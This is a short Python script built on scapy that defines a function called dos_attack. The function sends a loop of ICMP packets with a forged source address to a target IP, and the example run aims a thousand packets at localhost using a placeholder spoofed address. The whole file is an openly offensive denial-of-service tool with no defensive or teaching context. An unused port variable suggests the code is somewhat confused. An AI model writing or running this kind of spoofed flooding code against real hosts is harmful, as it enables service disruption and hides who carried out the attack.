from scapy.all import IP, ICMP, send

def dos_attack(target_ip, fake_source_ip, count=100):
    try:
        # Create and send the packets
        for _ in range(count):
            packet = IP(src=fake_source_ip, dst=target_ip) / ICMP()
            send(packet, verbose=False)
        print(f"DoS attack initiated from {fake_source_ip} to {target_ip}.")
    except Exception as e:
        print(f"An error occurred: {e}")

# Example usage
if __name__ == "__main__":
    target_ip = "127.0.0.1"
    target_port = 8000
    fake_source_ip = "FAKE_SOURCE_IP_ADDRESS" 
    dos_attack(target_ip, fake_source_ip, count=1000)